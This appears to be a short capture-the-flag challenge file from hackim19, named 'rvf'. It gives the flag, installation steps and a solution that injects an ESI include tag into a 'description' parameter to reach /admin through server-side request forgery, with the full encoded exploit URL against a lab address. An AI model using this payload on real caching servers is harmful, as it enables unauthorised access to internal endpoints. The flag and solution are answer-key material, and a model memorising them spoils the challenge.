# name: rvf

# flag: hackim19{h0w_Did_y0ou-Get_here}

# solution
- Need to perform ESI Injection on description
- SSRF to /admin

http://192.168.169.129:8080/edge?title=asd&description=asd%3Cesi:include%20src=%22http://192.168.169.129:8080/admin%22/%3E


#Installation
- run ./start.sh
